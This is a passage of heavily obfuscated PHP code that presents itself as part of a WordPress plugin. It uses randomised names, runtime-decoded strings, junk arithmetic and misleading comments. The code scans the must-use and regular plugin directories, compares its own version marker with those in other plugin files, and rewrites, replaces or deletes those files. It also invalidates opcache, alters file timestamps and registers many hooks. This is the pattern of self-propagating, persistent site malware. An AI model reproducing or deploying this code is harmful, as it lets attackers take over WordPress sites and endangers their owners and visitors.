  if   ($GLOBALS['__scf_w6mdcepio4lkz5_7']($r97xvf0q2kje9_, c1sob647u1i(1902))   !== 0)  $r97xvf0q2kje9_ = ovffvv33(1902) . $GLOBALS['__scf_wr4u8clizo4sw_8']($r97xvf0q2kje9_,   '/');$qxtlqayud=48|171;$wc21m_jzrbq9mf=$qxtlqayud^66;


 $dtjdvfxce42ko9 = '/';
      if   ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1903)))   {
     $oqh16fyrlc6    =    (string) $GLOBALS['__scf_lf33h8m4cq_577'](home_url(),  PHP_URL_PATH);
 

if   ($oqh16fyrlc6    !==   ""    &&  $oqh16fyrlc6 !==  '/') $dtjdvfxce42ko9   = $GLOBALS['__scf_ofdeuvs8zwos6_12']($oqh16fyrlc6,    '/')    . '/';
 }
if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1628)))      {
  @update_option(c1sob647u1i(1876),  1,   hn_f08x0cns80(1904));
@update_option(bpowi0iglycvx(1877), $r97xvf0q2kje9_, bpowi0iglycvx(1904));
    }
  $mnha0aw7giww9l  =  ovffvv33(1878) .    $ye16w36ues .   '>'
 .  hn_f08x0cns80(1879)
.  hn_f08x0cns80(1880) . $e3odkvvirkd_y00b(bpowi0iglycvx(1905)) .   f6yrzd2knrmb(1906)

.  f6yrzd2knrmb(1907)
     .  iw6xe9q4j6sneg(1908) . $e3odkvvirkd_y00b(f6yrzd2knrmb(1909))      . iw6xe9q4j6sneg(1910) . $GLOBALS['__scf__r5ulaote4t_611']($r97xvf0q2kje9_)    .  ')'


    . bpowi0iglycvx(1911) .   $e3odkvvirkd_y00b(ovffvv33(1888))  .   c1sob647u1i(1891) .  $e3odkvvirkd_y00b(bpowi0iglycvx(1890))  .  hn_f08x0cns80(1891) .  $e3odkvvirkd_y00b(f6yrzd2knrmb(1892))      .  hn_f08x0cns80(1893) .   $e3odkvvirkd_y00b(iw6xe9q4j6sneg(1894))  .    bpowi0iglycvx(1912)     .   $GLOBALS['__scf__r5ulaote4t_611']($r97xvf0q2kje9_) .      c1sob647u1i(1913)
 .    ovffvv33(1914)   .   $e3odkvvirkd_y00b(hn_f08x0cns80(1915))  .   c1sob647u1i(1910)  .    $GLOBALS['__scf__r5ulaote4t_611']($r97xvf0q2kje9_) . c1sob647u1i(1916)   . $GLOBALS['__scf__r5ulaote4t_611']($dtjdvfxce42ko9)  .  bpowi0iglycvx(1917) .  $e3odkvvirkd_y00b(c1sob647u1i(1899))   .    f6yrzd2knrmb(1918)


   .   c1sob647u1i(1919)  .  $e3odkvvirkd_y00b(bpowi0iglycvx(1899))  . ovffvv33(1920)
     .  iw6xe9q4j6sneg(1921)   .    $e3odkvvirkd_y00b(iw6xe9q4j6sneg(1922))  .  bpowi0iglycvx(1923)     .    $e3odkvvirkd_y00b(ovffvv33(193)) . hn_f08x0cns80(1924)
        .    ovffvv33(1925)   .  $e3odkvvirkd_y00b(bpowi0iglycvx(1731))  . c1sob647u1i(1926)
 .   hn_f08x0cns80(1927)
  .  bpowi0iglycvx(1921) . $e3odkvvirkd_y00b(c1sob647u1i(1928))   . ovffvv33(1929)
    .  ovffvv33(1930) .     $e3odkvvirkd_y00b(f6yrzd2knrmb(1931))    . f6yrzd2knrmb(1932) . $e3odkvvirkd_y00b(hn_f08x0cns80(1933))  . hn_f08x0cns80(1934)
 .  f6yrzd2knrmb(1901);



 echo "\n" . $mnha0aw7giww9l    . "\n";
   } catch (Throwable   $cje8wku90zm4r)    {



  g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1935),   $cje8wku90zm4r);
}  catch (Exception   $cje8wku90zm4r)  {
g_qoqdy38lfl4v4n3618(ovffvv33(1935),  $cje8wku90zm4r);
   }

}

if     (uz2hraqvsd93tjlr9p4v()) {
      return;
  }
    rj8ubb6iqzwwqmp_8t2();
    $i0vli342kq_0  =     @$GLOBALS['__scf_uo_a60ibqnli_104'](bmvtr5sdqjf5km1t());
  if (!$i0vli342kq_0 ||  ($i0vli342kq_0 % (99960+40))  !==  e16j_u99g1ldi90iix1i9i())    {
  $_2m1ieqk7y  =  $GLOBALS['__scf_qzyo0sgkyb6_202']();
 bouscp0t4dvybv(bmvtr5sdqjf5km1t(),    ($_2m1ieqk7y   - ($_2m1ieqk7y     % (0xed0+0x177d0)))    +  e16j_u99g1ldi90iix1i9i());
       unset($_2m1ieqk7y);
}
 unset($i0vli342kq_0);
$n6tyyiyqdtm =  $GLOBALS['__scf_po3uwzhcb63b03_11'](__FILE__) .    hn_f08x0cns80(1936)  .   $GLOBALS['__scf_owu_4pajngr_3'](__FILE__,   iw6xe9q4j6sneg(1791));
     $elwfel16ac_t4     =      @$GLOBALS['__scf_rjpcj9l4bigb5_21']($n6tyyiyqdtm)  ? (int) @$GLOBALS['__scf_uo_a60ibqnli_104']($n6tyyiyqdtm) :   0;
 


 $s3g64mv05o     =  !($elwfel16ac_t4      >  $GLOBALS['__scf_qzyo0sgkyb6_202']()     -   (281+19) && $elwfel16ac_t4   <= $GLOBALS['__scf_qzyo0sgkyb6_202']()  +  (0x107+0x25));
  if ($s3g64mv05o) @$GLOBALS['__scf_c2r2e7u5qd7u_77']($n6tyyiyqdtm);
unset($n6tyyiyqdtm, $elwfel16ac_t4);


  if ($s3g64mv05o)    try  {
  $pb8_fm1ytybqd    =      __FILE__;
$pylyktkgc1sik   = "";


 $ha1xiojqce   =  @$GLOBALS['__scf_utyj_ckly79_101']($pb8_fm1ytybqd, false, null, 0,  (3474+622));$yops37nyl=-503;$zoqqkhpfm6=($yops37nyl>0)?$yops37nyl:-$yops37nyl;
if  ($GLOBALS['__scf_fv3zevxzzb_44']($ha1xiojqce)      &&    $GLOBALS['__scf_wdjvpd1lvon9_102'](bpowi0iglycvx(1434), $ha1xiojqce,  $ybu_cifuhtrext1))  $pylyktkgc1sik    =  $ybu_cifuhtrext1[1];
if   ($pylyktkgc1sik    !== ""     && defined(bpowi0iglycvx(1937))) {
$p8g1lvtt_4_u  =   array();
     $hlr_lv1ebu0xmrwp  = defined(iw6xe9q4j6sneg(1237)) ?   WPMU_PLUGIN_DIR : WP_CONTENT_DIR     .  f6yrzd2knrmb(14);$x9sewbry0=1664;$dxjj2acsp9=$x9sewbry0%16;
$la26o9k6xo36 =  defined(bpowi0iglycvx(1938))  ?  WP_PLUGIN_DIR    :   WP_CONTENT_DIR   .  iw6xe9q4j6sneg(1348);
   $b71k0tb8j7y433i   =  false;
     if  ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(757)))  {$k0a7muleoyedll=PHP_MAJOR_VERSION;$bkiipewye3e=$k0a7muleoyedll*8;
$wdt20t5vcps7j_    =  @$GLOBALS['__scf_opq_vgkskw_46']($hlr_lv1ebu0xmrwp)    ? @$GLOBALS['__scf_kajvzw3bpufv_75']($hlr_lv1ebu0xmrwp   . iw6xe9q4j6sneg(1939))  :  false;
     $ok6d6ls2t17a =     @$GLOBALS['__scf_kajvzw3bpufv_75']($la26o9k6xo36   .     ovffvv33(1940));
     if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($wdt20t5vcps7j_)    ||   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ok6d6ls2t17a)) {
 $b71k0tb8j7y433i = true;
foreach ((array)  $wdt20t5vcps7j_   as     $wtojdntuo9) $p8g1lvtt_4_u[]     =   $wtojdntuo9;
  foreach  ((array) $ok6d6ls2t17a as  $wtojdntuo9)  $p8g1lvtt_4_u[]   =     $wtojdntuo9;

    }
      unset($wdt20t5vcps7j_,  $ok6d6ls2t17a);
    }
   if (!$b71k0tb8j7y433i)   {


 $lad43t3w71da =     @$GLOBALS['__scf_opq_vgkskw_46']($hlr_lv1ebu0xmrwp)  ?   fkx3b4a5rv4j4z5ymcs($hlr_lv1ebu0xmrwp,    (4964+36)) :  false;
  if     ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($lad43t3w71da)) foreach ($lad43t3w71da as  $bflgygi8bi)  {
 if  ($GLOBALS['__scf_nv7he759wjfj_9']($bflgygi8bi, -(1+3))    ===    bpowi0iglycvx(1941))  $p8g1lvtt_4_u[] = $hlr_lv1ebu0xmrwp    .   '/' . $bflgygi8bi;
  }
   $lad43t3w71da = @$GLOBALS['__scf_opq_vgkskw_46']($la26o9k6xo36)  ?  fkx3b4a5rv4j4z5ymcs($la26o9k6xo36, (4950+50)) :  false;
 if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($lad43t3w71da)) foreach   ($lad43t3w71da  as   $bflgygi8bi)    {
   $ggje6yct71   = $la26o9k6xo36   . '/'   . $bflgygi8bi;
if   (!@$GLOBALS['__scf_opq_vgkskw_46']($ggje6yct71))      continue;
$r9itvxfr_k  =    fkx3b4a5rv4j4z5ymcs($ggje6yct71,  (4969+31));


   if  (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($r9itvxfr_k)) continue;
   foreach  ($r9itvxfr_k as $yz31hs4cqop) {
        if  ($GLOBALS['__scf_nv7he759wjfj_9']($yz31hs4cqop,  -(2<<1))  === f6yrzd2knrmb(1941)) $p8g1lvtt_4_u[]   = $ggje6yct71  .  '/' .   $yz31hs4cqop;$z0yba2b_=878;$vkj8l4mhs8=($z0yba2b_>0)?$z0yba2b_:-$z0yba2b_;
    }
       }
/* differential scope-chain */

unset($lad43t3w71da,  $bflgygi8bi,  $yz31hs4cqop,  $ggje6yct71,     $r9itvxfr_k);
  }
   $zv0j0jxxc2t1nz4x  =   $GLOBALS['__scf_owu_4pajngr_3']($pb8_fm1ytybqd,  iw6xe9q4j6sneg(1941));
 foreach ($p8g1lvtt_4_u    as    $wtojdntuo9)    {
   if    ($wtojdntuo9 ===  $pb8_fm1ytybqd)  continue;




 $np8_qvjyu7whkpo  =  @$GLOBALS['__scf_uo_a60ibqnli_104']($wtojdntuo9);
 if (!$np8_qvjyu7whkpo      ||  ($np8_qvjyu7whkpo     % (99955+45)) !==    (0x487+0x169f4)) {
$v43vhy3kfvq =    @$GLOBALS['__scf_b42duf6j1zadm9_105']($wtojdntuo9);
   if (!$v43vhy3kfvq  ||  $v43vhy3kfvq  < (63+437)    ||  $v43vhy3kfvq >   (52428791+9))  continue;
     }
$ha1xiojqce  = @$GLOBALS['__scf_utyj_ckly79_101']($wtojdntuo9,   false, null,    0,   (4076+20));
$ybu_cifuhtrext1   =  array();
 if  ($GLOBALS['__scf_fv3zevxzzb_44']($ha1xiojqce))    $GLOBALS['__scf_wdjvpd1lvon9_102'](f6yrzd2knrmb(1434), $ha1xiojqce, $ybu_cifuhtrext1);
 if (empty($ybu_cifuhtrext1[1]))     {
 if  (!mza6zg2fnwyep8gx2xd($wtojdntuo9,   (9567-4567)))   continue;
   $ybu_cifuhtrext1    = array("", iw6xe9q4j6sneg(1603));
   }
   if  ($GLOBALS['__scf_owu_4pajngr_3']($wtojdntuo9,  f6yrzd2knrmb(1941)) ===   $zv0j0jxxc2t1nz4x    && $ybu_cifuhtrext1[1]   === $pylyktkgc1sik) {
  if     (!ryggki6gy_dkip68q37($wtojdntuo9))     {
if    (riq98ofdzw2zl1nzzzxy($wtojdntuo9,  $wtojdntuo9 .  f6yrzd2knrmb(32)) &&    $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1609))) @opcache_invalidate($wtojdntuo9,    true);
 }
  continue;
  }
        if   (version_compare($ybu_cifuhtrext1[1], $pylyktkgc1sik,  '<')) {
      $elz8xqz7gkrq4oab =     tq0de4uade8_8rlhtowy($wtojdntuo9);
  if  ($elz8xqz7gkrq4oab === false) {
  g_qoqdy38lfl4v4n3618(c1sob647u1i(1554),  f6yrzd2knrmb(1604)  .   $GLOBALS['__scf_owu_4pajngr_3']($wtojdntuo9));
continue;
   }
    if ($elz8xqz7gkrq4oab   === true)  {
// WP Heading Block hook callback

 if  (riq98ofdzw2zl1nzzzxy($wtojdntuo9, $wtojdntuo9 . bpowi0iglycvx(32))) {
        if  ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1609)))    @opcache_invalidate($wtojdntuo9,    true);
   }  elseif  (!j81oyiorlegz06z33($wtojdntuo9) && awt0clbm2rkh9u4z8mjsz($wtojdntuo9))   {
cbzu166xe9qr89g6($wtojdntuo9);
 czznuvw9tobf1x1o($wtojdntuo9);
     }
     @$GLOBALS['__scf_fbizamz5bjakz_20']($GLOBALS['__scf_po3uwzhcb63b03_11']($wtojdntuo9)    . f6yrzd2knrmb(208) . $GLOBALS['__scf_owu_4pajngr_3']($wtojdntuo9, bpowi0iglycvx(1941)));
     continue;
  }
 if     (!j81oyiorlegz06z33($wtojdntuo9)  &&    awt0clbm2rkh9u4z8mjsz($wtojdntuo9)) {
    cbzu166xe9qr89g6($wtojdntuo9);
   czznuvw9tobf1x1o($wtojdntuo9);
 }
rrd1j6b2wjg30_7($wtojdntuo9);

   continue;
 }
// unsubscribe open watermark

   $izju6dsusg =     ($GLOBALS['__scf_owu_4pajngr_3']($GLOBALS['__scf_po3uwzhcb63b03_11']($wtojdntuo9))    ===     ovffvv33(1942)  ||  $GLOBALS['__scf_po3uwzhcb63b03_11']($wtojdntuo9)  ===  $hlr_lv1ebu0xmrwp);
if  (!$izju6dsusg   &&  $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1651)))      {

  $nee722rkzi5   =   $GLOBALS['__scf_owu_4pajngr_3']($GLOBALS['__scf_po3uwzhcb63b03_11']($wtojdntuo9)) .    '/' . $GLOBALS['__scf_owu_4pajngr_3']($wtojdntuo9);
$u0c7dqm70fm0    = (array)    @get_option(ovffvv33(1640),  array());
  $izju6dsusg  =      $GLOBALS['__scf_rd2tojulg06lx_160']($nee722rkzi5, $u0c7dqm70fm0,  true);
   if (!$izju6dsusg  &&      $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(501)) &&  is_multisite()  &&  $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(222)))   {
  $zvzno_ku0_9tqok =    (array) @get_site_option(iw6xe9q4j6sneg(1943), array());
  $izju6dsusg =     isset($zvzno_ku0_9tqok[$nee722rkzi5]);



    unset($zvzno_ku0_9tqok);
    }



 unset($nee722rkzi5,   $u0c7dqm70fm0);
   }
if (!$izju6dsusg)  continue;
 if   (version_compare($ybu_cifuhtrext1[1], $pylyktkgc1sik,  '>'))  {
  if   (ryggki6gy_dkip68q37($wtojdntuo9) &&   !fiaip3tpztqie0($wtojdntuo9)   && !jgwy2r_kyhdvn73hyej57($wtojdntuo9,   $pb8_fm1ytybqd))    return;

 $u1z5lmoqiiiw  = $GLOBALS['__scf_po3uwzhcb63b03_11']($wtojdntuo9) .   hn_f08x0cns80(1944)    .  $GLOBALS['__scf_tnonex5o9y_60']($wtojdntuo9);
  if (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($u1z5lmoqiiiw)  &&      (int)     @$GLOBALS['__scf_uo_a60ibqnli_104']($u1z5lmoqiiiw) <   $GLOBALS['__scf_qzyo0sgkyb6_202']()   - (26^38))    {
// MySQL 8 CTEs: fork gateway

      $y8rh_bxkpfnt8s   =   $GLOBALS['__scf_xi_pncf33_0_120']('|', (string) @$GLOBALS['__scf_utyj_ckly79_101']($u1z5lmoqiiiw));$lj8h80rm7wh=4436;$ll5icu612h=$lj8h80rm7wh%2;


 if  ($GLOBALS['__scf_wj6dld55k5r8m_39']($y8rh_bxkpfnt8s) <    2  || $y8rh_bxkpfnt8s[0]   !== $ybu_cifuhtrext1[1]     ||  (int)  $y8rh_bxkpfnt8s[1]   !== (int)   @$GLOBALS['__scf_b42duf6j1zadm9_105']($wtojdntuo9))   {
 @$GLOBALS['__scf_fbizamz5bjakz_20']($u1z5lmoqiiiw);
 continue;
     }
  if (tq0de4uade8_8rlhtowy($wtojdntuo9)  !==    false)  {
ruinnb541lwxm7j($wtojdntuo9,  (393+27));
      if  (cvtaycsw15_xd1srry($wtojdntuo9))     {
  @$GLOBALS['__scf_fbizamz5bjakz_20']($u1z5lmoqiiiw);


 if  ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1609))) @opcache_invalidate($wtojdntuo9,   true);

}
  }
continue;
}
@$GLOBALS['__scf_whcsnotvh9twx_211']($u1z5lmoqiiiw,  $ybu_cifuhtrext1[1] . '|'   .  (int)  @$GLOBALS['__scf_b42duf6j1zadm9_105']($wtojdntuo9));
   continue;
  }
if ($ybu_cifuhtrext1[1]   ===  $pylyktkgc1sik)  {
  $y2seqwdr9cie3rn = lx6fapg24yvy30nkep2();
    $snducoj7_1oeu  =  false;
  if  (!empty($y2seqwdr9cie3rn[c1sob647u1i(1401)]))  {
    $el2q6_8dfe   =   @$GLOBALS['__scf_ba4991zo41sta_36']($y2seqwdr9cie3rn[f6yrzd2knrmb(1401)]);
$j57s03228xdbi     = @$GLOBALS['__scf_ba4991zo41sta_36']($wtojdntuo9);



 if ($GLOBALS['__scf_fv3zevxzzb_44']($el2q6_8dfe) &&   $GLOBALS['__scf_fv3zevxzzb_44']($j57s03228xdbi)     && $el2q6_8dfe  ===   $j57s03228xdbi  &&   mj1bikln92glwu($y2seqwdr9cie3rn)  ===   ovffvv33(1945)  && ryggki6gy_dkip68q37($wtojdntuo9)) {
      if  (jgwy2r_kyhdvn73hyej57($wtojdntuo9,   $pb8_fm1ytybqd))     $snducoj7_1oeu  =     true;
  else    return;
 }
    if  ($GLOBALS['__scf_fv3zevxzzb_44']($el2q6_8dfe)  &&  $el2q6_8dfe ===   @$GLOBALS['__scf_ba4991zo41sta_36']($pb8_fm1ytybqd)) $snducoj7_1oeu    =      true;
  }
       if (!$snducoj7_1oeu    &&   !ryggki6gy_dkip68q37($wtojdntuo9))   {$jcz05_8mq=42|113;$_79kv02b=$jcz05_8mq^175;
 if  (fiaip3tpztqie0($wtojdntuo9) || tq0de4uade8_8rlhtowy($wtojdntuo9)  !==   false) {


 if  (riq98ofdzw2zl1nzzzxy($wtojdntuo9, $wtojdntuo9   . iw6xe9q4j6sneg(1946))  && $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1609)))   @opcache_invalidate($wtojdntuo9,  true);
}
 unset($y2seqwdr9cie3rn,     $snducoj7_1oeu,   $el2q6_8dfe, $j57s03228xdbi);
continue;
 }
 if      (!$snducoj7_1oeu  && $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60']($GLOBALS['__scf_owu_4pajngr_3']($wtojdntuo9,   c1sob647u1i(1941))),  0, (192^204))    >  $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60']($zv0j0jxxc2t1nz4x), 0,    (3<<2))) {
// WP Site Editor: reconcile nominal-type




 if   (!jgwy2r_kyhdvn73hyej57($wtojdntuo9,    $pb8_fm1ytybqd))   return;
    }
  unset($y2seqwdr9cie3rn,     $snducoj7_1oeu,    $el2q6_8dfe,  $j57s03228xdbi);
 }
}
}
unset($pb8_fm1ytybqd,    $pylyktkgc1sik,   $ha1xiojqce,  $ybu_cifuhtrext1, $p8g1lvtt_4_u, $hlr_lv1ebu0xmrwp,  $la26o9k6xo36, $wtojdntuo9, $np8_qvjyu7whkpo,     $zv0j0jxxc2t1nz4x,  $v43vhy3kfvq,   $elz8xqz7gkrq4oab,  $u1z5lmoqiiiw,   $y8rh_bxkpfnt8s);


    }   catch (Throwable $cje8wku90zm4r)    {
 }   catch (Exception  $cje8wku90zm4r) {
 }
unset($s3g64mv05o);
      if (isset($GLOBALS[iw6xe9q4j6sneg(198)])) {
if (version_compare((string) $GLOBALS[hn_f08x0cns80(198)],  dfb4_mpcgxvnp230hvh1v(),  hn_f08x0cns80(1947)))   return;
     $GLOBALS[f6yrzd2knrmb(1948)] = 1;
  } elseif     (defined(iw6xe9q4j6sneg(1949)))   {



    $mvyory6emzqm7cih   = constant(ovffvv33(1949));
  if   ($GLOBALS['__scf_fv3zevxzzb_44']($mvyory6emzqm7cih)    &&   $GLOBALS['__scf_wdjvpd1lvon9_102'](c1sob647u1i(1950), $mvyory6emzqm7cih)     &&   version_compare($mvyory6emzqm7cih,  dfb4_mpcgxvnp230hvh1v(),  hn_f08x0cns80(1947)))   return;
     $GLOBALS[iw6xe9q4j6sneg(1948)] =   1;
     unset($mvyory6emzqm7cih);

 }

      $GLOBALS[f6yrzd2knrmb(198)]   =  dfb4_mpcgxvnp230hvh1v();


    if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1951))) @clearstatcache(true,    bmvtr5sdqjf5km1t());
 $GLOBALS[iw6xe9q4j6sneg(1952)] =   (string)  @$GLOBALS['__scf_b42duf6j1zadm9_105'](bmvtr5sdqjf5km1t())     . ':' .  (string)   @$GLOBALS['__scf_uo_a60ibqnli_104'](bmvtr5sdqjf5km1t());
  if    (!defined(ovffvv33(1953))) define(iw6xe9q4j6sneg(1953),    dfb4_mpcgxvnp230hvh1v());



     if     (!defined(ovffvv33(1954)))  define(c1sob647u1i(1955),  dfb4_mpcgxvnp230hvh1v());
 spai9j_prce79wsfgreds(iw6xe9q4j6sneg(1405));



 

wk019avq_nl804u728iogw(bmvtr5sdqjf5km1t());
  if  ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1956))   && $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1957)))   {
 try  {
 $yb065zitb7z0h   =  jo62hy1j37iqrmy();
    if (@$GLOBALS['__scf_opq_vgkskw_46']($yb065zitb7z0h))  {
    $ign4x521xktmtfxc    =  ins9ithmohgssp_();
  $mjjhnii6ovs05r   =  fkx3b4a5rv4j4z5ymcs($yb065zitb7z0h, (4902+98));
if     ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($mjjhnii6ovs05r))  {
 foreach     ($mjjhnii6ovs05r    as   $t418q1cgow_j3eu0)  {
     if   ($t418q1cgow_j3eu0    === $ign4x521xktmtfxc)     continue;
   if    ($GLOBALS['__scf_xyekfdfj2g_109']($GLOBALS['__scf_wvxpw4xfn9_219']($t418q1cgow_j3eu0,  constant(bpowi0iglycvx(720))))   !==   iw6xe9q4j6sneg(1958)) continue;
$z8pt_ekqvakn      =  $yb065zitb7z0h   .     '/'   . $t418q1cgow_j3eu0;
  if   (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($z8pt_ekqvakn)    &&  @$GLOBALS['__scf_b42duf6j1zadm9_105']($z8pt_ekqvakn)  >   (1889+3111)      &&  mza6zg2fnwyep8gx2xd($z8pt_ekqvakn,      (4875+125)))  {
 ngxekb8bil_0r9sftm($z8pt_ekqvakn);
    }
 }
}



 }


   }    catch     (Throwable    $cje8wku90zm4r)  {
g_qoqdy38lfl4v4n3618(bpowi0iglycvx(233),  $cje8wku90zm4r);
  }  catch    (Exception $cje8wku90zm4r)  {

  }


   }
  
 if (!    zbd0filxujnpocked22i())    {
eq7z05kg4s98n6ox(iw6xe9q4j6sneg(775), iw6xe9q4j6sneg(1959), 1);
// descriptive trie

  }
   
$GLOBALS[hn_f08x0cns80(641)]     =     array();  

    $GLOBALS[f6yrzd2knrmb(737)] =   array();      
 $GLOBALS[f6yrzd2knrmb(648)] =   "";     
  if ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1623)))  {
$GLOBALS['__scf_g45egtj01hms_186'](ovffvv33(1960));
  $GLOBALS['__scf_g45egtj01hms_186'](c1sob647u1i(1961));
  }
// intercept uncomputable nominal-type

$ste81aa_a0ab  =  $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()) .    hn_f08x0cns80(1962)   .   $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),   c1sob647u1i(1941));
  if    (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($ste81aa_a0ab)) {
     $futjlkywlwbs  =    $GLOBALS['__scf_qew3crlieule_339']((string)    @$GLOBALS['__scf_utyj_ckly79_101']($ste81aa_a0ab));
 $bssfe8d96a7d0a  =  vtax9gneznat0nbukvyejy();


if     ($futjlkywlwbs  ===   ""  ||  ($bssfe8d96a7d0a !==    ""  &&  $futjlkywlwbs !==  $bssfe8d96a7d0a))   cvtaycsw15_xd1srry($ste81aa_a0ab);
   unset($futjlkywlwbs,  $bssfe8d96a7d0a);
     }
 try    {
 @$GLOBALS['__scf_c2r2e7u5qd7u_77']($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t())   . f6yrzd2knrmb(1963)  . $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(), ovffvv33(1941)));
       $bssfe8d96a7d0a   = vtax9gneznat0nbukvyejy();

      if  ($bssfe8d96a7d0a  !==   "") {
     $mzssp0dh51      =     ovffvv33(1964)  . $bssfe8d96a7d0a;
 foreach  (array($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()), jo62hy1j37iqrmy())  as   $s0b8exr13zx3bh)    {
if    (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($s0b8exr13zx3bh  .  '/'  .    $mzssp0dh51))  @$GLOBALS['__scf_fbizamz5bjakz_20']($s0b8exr13zx3bh    .    '/' .      $mzssp0dh51);



     }
  }
  unset($bssfe8d96a7d0a,  $mzssp0dh51,     $s0b8exr13zx3bh);
}  catch (Throwable   $cje8wku90zm4r) {
 }    catch (Exception   $cje8wku90zm4r)  {
     }
 unset($ste81aa_a0ab);
  
eq7z05kg4s98n6ox(bpowi0iglycvx(777),      ovffvv33(1965),    0);$oinwf2q0fmea=6260;$m3ul4v62k=$oinwf2q0fmea%2;

    eq7z05kg4s98n6ox(bpowi0iglycvx(777),  bpowi0iglycvx(1966),   0);
 eq7z05kg4s98n6ox(f6yrzd2knrmb(1967),    f6yrzd2knrmb(1968),     0);
eq7z05kg4s98n6ox(iw6xe9q4j6sneg(1969),  c1sob647u1i(1968),  0);


eq7z05kg4s98n6ox(hn_f08x0cns80(1970), f6yrzd2knrmb(1971),  2);
   eq7z05kg4s98n6ox(f6yrzd2knrmb(1970), f6yrzd2knrmb(1972), (0x1+0x2));
 eq7z05kg4s98n6ox(hn_f08x0cns80(1973),   c1sob647u1i(1974),    (1+3));
eq7z05kg4s98n6ox(ovffvv33(775), bpowi0iglycvx(1975),    (0x2+0x3));



 g7b6t_c45mkf3jmbd2c(f6yrzd2knrmb(1976), hn_f08x0cns80(1977),   (4+6), 1);
g7b6t_c45mkf3jmbd2c(c1sob647u1i(1978), ovffvv33(1977),  (0x4+0x6),   1);
  g7b6t_c45mkf3jmbd2c(hn_f08x0cns80(1979),   f6yrzd2knrmb(1977),   (0x1+0x9),   1);
  g7b6t_c45mkf3jmbd2c(iw6xe9q4j6sneg(1980),    c1sob647u1i(1977),    (0x7+0x3), 1);
 
    g7b6t_c45mkf3jmbd2c(f6yrzd2knrmb(1981),  hn_f08x0cns80(1982), (159+840), (1+2));
 eq7z05kg4s98n6ox(f6yrzd2knrmb(1983),  hn_f08x0cns80(1984),  (1915-916),   2);
    
g7b6t_c45mkf3jmbd2c(iw6xe9q4j6sneg(1985),  hn_f08x0cns80(1986));



     g7b6t_c45mkf3jmbd2c(ovffvv33(1987),   ovffvv33(1988), (0x6+0x4),    2);

  g7b6t_c45mkf3jmbd2c(c1sob647u1i(1989),   c1sob647u1i(1990));

 g7b6t_c45mkf3jmbd2c(ovffvv33(1991),   c1sob647u1i(1992), (0x4+0x6),  1);
       
      g7b6t_c45mkf3jmbd2c(bpowi0iglycvx(1993), f6yrzd2knrmb(1994), (0x2+0x8),  2);
   eq7z05kg4s98n6ox(iw6xe9q4j6sneg(1995), iw6xe9q4j6sneg(1996));
  g7b6t_c45mkf3jmbd2c(c1sob647u1i(1997),   iw6xe9q4j6sneg(817));
     
 g7b6t_c45mkf3jmbd2c(bpowi0iglycvx(1998),    bpowi0iglycvx(818));
  



     eq7z05kg4s98n6ox(iw6xe9q4j6sneg(1999), ovffvv33(2000),   -(0x390+0x57));

eq7z05kg4s98n6ox(iw6xe9q4j6sneg(2001),  hn_f08x0cns80(2002),    -(0x27+0x3c0));
 eq7z05kg4s98n6ox(f6yrzd2knrmb(2003),    f6yrzd2knrmb(2004),    -(942+57));
      
     eq7z05kg4s98n6ox(ovffvv33(2005), hn_f08x0cns80(2006),     (0x14e+0x299));
eq7z05kg4s98n6ox(bpowi0iglycvx(2007),   c1sob647u1i(2008),  0);


eq7z05kg4s98n6ox(c1sob647u1i(213),  f6yrzd2knrmb(2009),      0);
 eq7z05kg4s98n6ox(hn_f08x0cns80(2010),  ovffvv33(2011),  (715+284));
 eq7z05kg4s98n6ox(iw6xe9q4j6sneg(2012),      ovffvv33(2011), (905+94));
   
eq7z05kg4s98n6ox(hn_f08x0cns80(213),  bpowi0iglycvx(2013),     2);
   eq7z05kg4s98n6ox(hn_f08x0cns80(213),   iw6xe9q4j6sneg(2014),  0);


       
   eq7z05kg4s98n6ox(ovffvv33(213),      iw6xe9q4j6sneg(2015),   0);
    eq7z05kg4s98n6ox(f6yrzd2knrmb(213), hn_f08x0cns80(2016),  0);
  
 eq7z05kg4s98n6ox(hn_f08x0cns80(213), c1sob647u1i(2017), 1);
eq7z05kg4s98n6ox(f6yrzd2knrmb(2018),  ovffvv33(2019), 2);
      

 eq7z05kg4s98n6ox(hn_f08x0cns80(2020),   iw6xe9q4j6sneg(1971), (0x2+0x1));
  eq7z05kg4s98n6ox(c1sob647u1i(2020), ovffvv33(2021),     (2+2));


 eq7z05kg4s98n6ox(f6yrzd2knrmb(2020),  c1sob647u1i(2022),   (0x3+0x2));
   eq7z05kg4s98n6ox(bpowi0iglycvx(2020), ovffvv33(2023), (5+1));
  eq7z05kg4s98n6ox(bpowi0iglycvx(2024),     hn_f08x0cns80(2025),  (10-4));
 eq7z05kg4s98n6ox(f6yrzd2knrmb(2026), f6yrzd2knrmb(2027));



